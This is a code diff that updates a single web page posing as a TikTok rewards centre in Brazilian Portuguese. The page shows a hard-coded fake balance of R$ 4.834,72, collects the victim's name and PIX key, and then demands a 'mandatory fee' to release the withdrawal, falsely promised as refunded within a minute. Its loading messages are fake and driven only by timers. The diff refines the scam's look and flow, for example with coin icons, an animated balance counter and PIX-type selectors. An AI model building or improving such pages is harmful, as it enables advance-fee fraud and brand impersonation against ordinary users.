@@ -198,15 +198,23 @@
 
     @keyframes loadBar {
       0% {
-        width: 8%;
+        transform: scaleX(0);
       }
 
-      55% {
-        width: 57%;
+      22% {
+        transform: scaleX(0.14);
+      }
+
+      56% {
+        transform: scaleX(0.52);
+      }
+
+      83% {
+        transform: scaleX(0.86);
       }
 
       100% {
-        width: 82%;
+        transform: scaleX(1);
       }
     }
 
@@ -232,6 +240,11 @@
       width: 42px;
       height: 42px;
       object-fit: contain;
+    }
+
+    .loading-brand-mark {
+      width: 56px;
+      height: 56px;
     }
 
     .top-note {
@@ -267,10 +280,14 @@
     }
 
     .loading-fill {
+      width: 100%;
       height: 100%;
       border-radius: inherit;
       background: var(--accent);
-      animation: loadBar 1.9s ease-in-out forwards;
+      transform: scaleX(0);
+      transform-origin: left center;
+      animation: loadBar 2.35s linear forwards;
+      will-change: transform;
     }
 
     .summary-head {
@@ -334,6 +351,39 @@
       font-weight: 900;
     }
 
+    .balance-copy {
+      min-width: 0;
+    }
+
+    .balance-title {
+      display: inline-flex !important;
+      align-items: center;
+      gap: 5px;
+    }
+
+    .balance-coin-icon {
+      position: relative;
+      display: inline-grid;
+      flex: 0 0 auto;
+      width: 18px;
+      height: 18px;
+      place-items: center;
+      border: 2px solid #fff4bb;
+      border-radius: 50%;
+      background:
+        radial-gradient(circle at 34% 27%, rgba(255, 255, 255, 0.92) 0 12%, transparent 13%),
+        linear-gradient(145deg, #ffe879 0%, #f7b928 48%, #d98908 100%);
+      box-shadow: 0 2px 5px rgba(201, 141, 10, 0.3);
+    }
+
+    .balance-coin-icon::after {
+      content: "P";
+      color: #8a5700;
+      font-size: 10px;
+      font-weight: 900;
+      line-height: 1;
+    }
+
     .balance-strip span,
     .balance-card span,
     .confirm-balance span {
@@ -374,7 +424,7 @@
       width: 15px;
       height: 15px;
       border-radius: 4px;
-      object-fit: cover;
+      object-fit: contain;
       filter: drop-shadow(0 1px 2px rgba(20, 22, 28, 0.14));
     }
 
@@ -632,12 +682,17 @@
       width: 60px;
       height: 60px;
       place-items: center;
-      border: 5px solid rgba(255, 255, 255, 0.18);
+      border: 5px solid rgba(255, 255, 255, 0.2);
       border-radius: 50%;
-      background: #c99922;
-      color: #745300;
+      background:
+        radial-gradient(circle at 34% 27%, rgba(255, 255, 255, 0.92) 0 11%, transparent 12%),
+        linear-gradient(145deg, #ffe879 0%, #f7b928 48%, #d98908 100%);
+      color: #8a5700;
       font-size: 34px;
       font-weight: 900;
+      box-shadow:
+        inset -7px -8px 0 rgba(126, 76, 0, 0.13),
+        0 10px 20px rgba(0, 0, 0, 0.24);
     }
 
     .balance-subline {
@@ -677,18 +732,64 @@
     .withdraw-method-row {
       display: flex;
       align-items: center;
-      gap: 6px;
+      gap: 5px;
       margin: 0 0 13px;
       color: #7f838d;
       font-size: 12px;
       font-weight: 800;
     }
 
+    .withdraw-method-row strong {
+      color: #21bfb4;
+    }
+
     .withdraw-method-row img {
       width: 14px;
       height: 14px;
       border-radius: 4px;
-      object-fit: cover;
+      object-fit: contain;
+    }
+
+    .withdraw-method-row .card-transfer-icon {
+      width: 14px;
+      height: 14px;
+      border-radius: 0;
+    }
+
+    .pix-type-list {
+      display: grid;
+      margin-top: 8px;
+      border-top: 1px solid #edf0f3;
+      background: #fff;
+    }
+
+    .pix-type-option {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      min-height: 44px;
+      padding: 0;
+      border-bottom: 1px solid #edf0f3;
+      background: #fff;
+      color: #4a4d56;
+      font-size: 13px;
+      font-weight: 800;
+      text-align: left;
+    }
+
+    .pix-type-option::after {
+      content: "";
+      width: 16px;
+      height: 16px;
+      border: 2px solid #e2e4e8;
+      border-radius: 50%;
+      background: #fff;
+      box-shadow: inset 0 0 0 3px #fff;
+    }
+
+    .pix-type-option.is-selected::after {
+      border-color: #e5386f;
+      background: #e5386f;
     }
 
     .withdraw-options {
@@ -1393,7 +1494,7 @@
       z-index: 30;
       display: none;
       gap: 0;
-      padding: 0 14px 14px;
+      padding: 0 14px max(14px, env(safe-area-inset-bottom));
     }
 
     .method-sheet.visible {
@@ -1401,7 +1502,7 @@
     }
 
     .method-sheet label {
-      margin-bottom: 9px;
+      margin-bottom: 8px;
       color: #2f323b;
       font-size: 11px;
       font-weight: 900;
@@ -1409,7 +1510,7 @@
 
     .method-sheet .field-control,
     .method-sheet .field-group {
-      padding: 12px 0;
+      padding: 14px 0 12px;
       border-bottom: 1px solid #e7e8ee;
     }
 
@@ -1421,7 +1522,7 @@
       border-radius: 0;
       background: transparent;
       color: #2f323b;
-      font-size: 16px;
+      font-size: 13px;
       font-weight: 700;
       box-shadow: none;
     }
@@ -1446,9 +1547,17 @@
       border-color: #b0b3bb;
     }
 
+    .method-sheet .select-wrap {
+      display: block;
+    }
+
+    .method-sheet .pix-type-list {
+      display: none;
+    }
+
     .method-sheet .request-withdraw {
       min-height: 39px;
-      margin-top: 12px;
+      margin-top: 16px;
       border-radius: 5px;
       font-size: 12px;
       box-shadow: none;
@@ -1489,6 +1598,10 @@
       cursor: pointer;
       font-size: 24px;
       line-height: 1;
+    }
+
+    .method-sheet .modal-close {
+      display: none;
     }
 
     .modal-close:hover,
@@ -1586,9 +1699,9 @@
 </head>
 <body>
   <main class="app" aria-label="Central de recompensas">
-    <section class="screen" id="loading-screen">
+    <section class="screen" id="loading-screen" hidden>
       <header class="brand" aria-label="Central de Recompensas">
-        <img class="brand-mark" src="assets/tiktok-logo.png" alt="TikTok">
+        <img class="brand-mark loading-brand-mark" src="assets/tiktok-transition-logo.png" alt="TikTok">
       </header>
 
       <div class="loading-panel">
@@ -1599,18 +1712,18 @@
       </div>
     </section>
 
-    <section class="screen" id="home-screen" hidden>
+    <section class="screen" id="home-screen">
       <header class="brand" aria-label="Central de Recompensas">
         <img class="brand-mark" src="assets/tiktok-logo.png" alt="TikTok">
       </header>
 
       <section class="balance-strip" aria-label="Resumo de saldo">
-        <div>
-          <span>Seu saldo</span>
+        <div class="balance-copy">
+          <span class="balance-title"><i class="balance-coin-icon" aria-hidden="true"></i>Seu saldo</span>
           <strong class="js-balance-amount">R$ 4.834,72</strong>
         </div>
         <div class="withdraw-action" aria-label="Saque via PIX">
-          <img class="withdraw-pix-icon" src="assets/pix-symbol.png" alt="">
+          <img class="withdraw-pix-icon" src="assets/pix-symbol-bw.png" alt="">
           <button class="withdraw js-open-withdraw" id="open-withdraw" type="button">Sacar</button>
         </div>
       </section>
@@ -1698,13 +1811,13 @@
       </section>
     </section>
 
-    <section class="home-withdraw-card" id="home-withdraw-card" aria-label="Saque disponível" hidden>
-      <div>
-        <span>Disponível para saque</span>
+    <section class="home-withdraw-card" id="home-withdraw-card" aria-label="Saque disponível">
+      <div class="balance-copy">
+        <span class="balance-title"><i class="balance-coin-icon" aria-hidden="true"></i>Disponível para saque</span>
         <strong class="js-balance-amount">R$ 4.834,72</strong>
       </div>
       <div class="withdraw-action" aria-label="Saque via PIX">
-        <img class="withdraw-pix-icon" src="assets/pix-symbol.png" alt="">
+        <img class="withdraw-pix-icon" src="assets/pix-symbol-bw.png" alt="">
         <button class="withdraw js-open-withdraw" type="button">Sacar</button>
       </div>
     </section>
@@ -1720,7 +1833,7 @@
       </header>
 
       <section class="balance-card" aria-label="Saldo do pedido">
-        <span>Seu saldo</span>
+        <span class="balance-title"><i class="balance-coin-icon" aria-hidden="true"></i>Seu saldo</span>
         <strong class="js-balance-amount">R$ 4.834,72</strong>
         <p class="balance-subline">Valor registrado para solicitação de saque</p>
         <p class="last-reward">Última recompensa: R$ 646,43</p>
@@ -1730,8 +1843,10 @@
       <section class="data-card" aria-label="Dados do pedido">
         <h2 class="data-title">Sacar dinheiro</h2>
         <div class="withdraw-method-row">
+          <img class="card-transfer-icon" src="assets/card-transfer-icon.png" alt="">
           <span>Transferência via</span>
-          <img src="assets/pix-symbol.png" alt="">
+          <span class="method-separator" aria-hidden="true">/</span>
+          <img src="assets/pix-symbol-green.png" alt="">
           <strong>PIX</strong>
         </div>
 
@@ -1787,6 +1902,12 @@
               <option value="aleatoria">Chave aleatória</option>
             </select>
           </div>
+          <div class="pix-type-list" role="radiogroup" aria-label="Tipo de chave PIX">
+            <button class="pix-type-option is-selected" type="button" role="radio" aria-checked="true" data-pix-type="cpf">CPF</button>
+            <button class="pix-type-option" type="button" role="radio" aria-checked="false" data-pix-type="email">E-mail</button>
+            <button class="pix-type-option" type="button" role="radio" aria-checked="false" data-pix-type="telefone">Celular</button>
+            <button class="pix-type-option" type="button" role="radio" aria-checked="false" data-pix-type="aleatoria">Chave Aleatoria</button>
+          </div>
         </div>
 
         <div class="field-control">
@@ -1813,8 +1934,8 @@
       <div class="step-banner" id="step-banner">Você está a 1 passo de finalizar a solicitação</div>
 
       <section class="confirm-balance fee-balance" aria-label="Saldo disponível">
-        <span>Saldo disponível</span>
-        <strong>R$ 4.834,72</strong>
+        <span class="balance-title"><i class="balance-coin-icon" aria-hidden="true"></i>Saldo disponível</span>
+        <strong class="js-balance-amount">R$ 4.834,72</strong>
         <small>Aguardando confirmação para saque</small>
       </section>
 
@@ -1825,7 +1946,7 @@
           <span class="badge">Valor reembolsável</span>
         </div>
         <p class="security-copy">
-          Taxa obrigatória para liberação do saque no valor de <strong>R$ 4.834,72</strong>. O valor de <strong>R$ 21,37</strong> será reembolsado integralmente para você em 1 minuto.
+          Taxa obrigatória para liberação do saque no valor de <strong class="js-balance-amount">R$ 4.834,72</strong>. O valor de <strong>R$ 21,37</strong> será reembolsado integralmente para você em 1 minuto.
         </p>
 
         <div class="pix-action">
@@ -1859,7 +1980,7 @@
         </div>
         <div class="data-row">
           <span>Valor a receber</span>
-          <strong>R$ 4.834,72</strong>
+          <strong class="js-balance-amount">R$ 4.834,72</strong>
         </div>
       </section>
 
@@ -1875,7 +1996,7 @@
         </div>
         <div class="process-row">
           <span class="process-index">3</span>
-          <p>Acessar saldo completo <small>R$ 4.834,72 liberado para saque</small></p>
+          <p>Acessar saldo completo <small><span class="js-balance-amount">R$ 4.834,72</span> liberado para saque</small></p>
         </div>
       </section>
 
@@ -1895,7 +2016,7 @@
     const confirmScreen = document.querySelector("#confirm-screen");
     const homeWithdrawCard = document.querySelector("#home-withdraw-card");
     const screens = [loadingScreen, homeScreen, withdrawScreen, confirmScreen];
-    let activeScreen = loadingScreen;
+    let activeScreen = homeScreen;
     let screenTransitionId = 0;
     const openWithdrawButtons = document.querySelectorAll(".js-open-withdraw");
     const backHome = document.querySelector("#back-home");
@@ -1912,6 +2033,7 @@
     const requestWithdraw = document.querySelector("#request-withdraw");
     const nameInput = document.querySelector("#withdraw-name");
     const pixTypeInput = document.querySelector("#pix-type");
+    const pixTypeOptions = document.querySelectorAll(".pix-type-option");
     const pixKeyInput = document.querySelector("#pix-key");
     const nameError = document.querySelector("#name-error");
     const pixKeyError = document.querySelector("#pix-key-error");
@@ -1934,7 +2056,7 @@
 
     const withdrawalData = {
       name: "",
-      pixType: "email",
+      pixType: "",
       pixKey: "",
       document: "",
       email: "",
@@ -1949,6 +2071,7 @@
     let hasGeneratedPix = false;
     let paymentTimerInterval = null;
     let paymentTimeLeft = 300;
+    let loadingSequenceTimers = [];
 
     const touchedFields = {
       name: false,
@@ -1960,6 +2083,43 @@
         style: "currency",
         currency: "BRL",
       }).format(value);
+    }
+
+    function animateMoneyElement(element, targetValue, { duration = 1150 } = {}) {
+      if (!element) return;
+
+      const prefersReducedMotion = window.matchMedia("(prefers-reduced-motion: reduce)").matches;
+      const previousFrame = Number(element.dataset.balanceAnimationFrame || 0);
+      if (previousFrame) {
+        cancelAnimationFrame(previousFrame);
+      }
+
+      if (prefersReducedMotion) {
+        element.textContent = formatMoney(targetValue);
+        element.dataset.balanceValue = String(targetValue);
+        return;
+      }
+
+      const startValue = Number(element.dataset.balanceValue || 0);
+      const startedAt = performance.now();
+      const easeOutCubic = (progress) => 1 - Math.pow(1 - progress, 3);
+
+      function tick(now) {
+        const progress = Math.min((now - startedAt) / duration, 1);
+        const currentValue = startValue + (targetValue - startValue) * easeOutCubic(progress);
+        element.textContent = formatMoney(currentValue);
+
+        if (progress < 1) {
+          element.dataset.balanceAnimationFrame = String(requestAnimationFrame(tick));
+          return;
+        }
+
+        element.textContent = formatMoney(targetValue);
+        element.dataset.balanceValue = String(targetValue);
+        delete element.dataset.balanceAnimationFrame;
+      }
+
+      element.dataset.balanceAnimationFrame = String(requestAnimationFrame(tick));
     }
 
     function formatCurrentDate() {
@@ -1977,16 +2137,13 @@
     function setDisplayedBalance() {
       const fixedBalance = 4834.72;
       balanceAmounts.forEach((amount) => {
-        amount.textContent = formatMoney(fixedBalance);
-      });
-      selectedWithdrawAmounts.forEach((amount) => {
-        amount.textContent = formatMoney(withdrawalData.amount);
+        animateMoneyElement(amount, fixedBalance);
       });
     }
 
     function setSelectedWithdrawAmount() {
       selectedWithdrawAmounts.forEach((amount) => {
-        amount.textContent = formatMoney(withdrawalData.amount);
+        animateMoneyElement(amount, withdrawalData.amount);
       });
       withdrawOptions.forEach((option) => {
         option.classList.toggle("is-selected", Number(option.dataset.withdrawAmount) === withdrawalData.quickAmount);
@@ -1997,6 +2154,19 @@
     function setSelectedQuickAmount(value) {
       withdrawalData.quickAmount = Number(value);
       setSelectedWithdrawAmount();
+    }
+
+    function updatePixTypeOptions() {
+      pixTypeOptions.forEach((option) => {
+        const isSelected = option.dataset.pixType === pixTypeInput.value;
+        option.classList.toggle("is-selected", isSelected);
+        option.setAttribute("aria-checked", String(isSelected));
+      });
+    }
+
+    function setSelectedPixType(value) {
+      pixTypeInput.value = value;
+      pixTypeInput.dispatchEvent(new Event("change", { bubbles: true }));
     }
 
     function setMethodBackdropVisible(isVisible) {
@@ -2067,34 +2237,33 @@
 
     function setLoadingMessage(message) {
       loadingText.textContent = message;
+    }
+
+    function restartLoadingBar() {
       loadingFill.style.animation = "none";
+      loadingFill.style.transform = "scaleX(0)";
       loadingFill.offsetHeight;
       loadingFill.style.animation = "";
+      loadingFill.style.transform = "";
     }
 
     function runWithdrawLoadingSequence(onComplete) {
-      const messages = [
-        "Validando dados...",
-        "Concluindo resgate...",
-        "Quase pronto...",
+      loadingSequenceTimers.forEach((timer) => window.clearTimeout(timer));
+      loadingSequenceTimers = [];
+      restartLoadingBar();
+
+      const steps = [
+        { delay: 0, message: "Validando dados..." },
+        { delay: 900, message: "Conectando ao servidor..." },
+        { delay: 1620, message: "Quase pronto..." },
       ];
-      let index = 0;
 
-      setLoadingMessage(messages[index]);
+      steps.forEach((step) => {
+        const timer = window.setTimeout(() => setLoadingMessage(step.message), step.delay);
+        loadingSequenceTimers.push(timer);
+      });
 
-      const nextMessage = () => {
-        index += 1;
-
-        if (index >= messages.length) {
-          onComplete();
-          return;
-        }
-
-        setLoadingMessage(messages[index]);
-        window.setTimeout(nextMessage, 760);
-      };
-
-      window.setTimeout(nextMessage, 760);
+      loadingSequenceTimers.push(window.setTimeout(onComplete, 2380));
     }
 
     function formatCountdown(totalSeconds) {
@@ -2449,9 +2618,16 @@
     });
 
     pixTypeInput.addEventListener("change", () => {
+      updatePixTypeOptions();
       updatePixKeyField({ clear: true });
       touchedFields.pixKey = false;
       validateWithdrawForm();
+    });
+
+    pixTypeOptions.forEach((option) => {
+      option.addEventListener("click", () => {
+        setSelectedPixType(option.dataset.pixType);
+      });
     });
 
     nameInput.addEventListener("input", () => {
@@ -2571,11 +2747,11 @@
 
     setDisplayedBalance();
     setSelectedWithdrawAmount();
+    updatePixTypeOptions();
     setReviewDate();
     updatePixKeyField();
     validateWithdrawForm();
     loadFooterImages();
-    window.setTimeout(() => showScreen(homeScreen), 1900);
 </script>
 </body>
 </html>
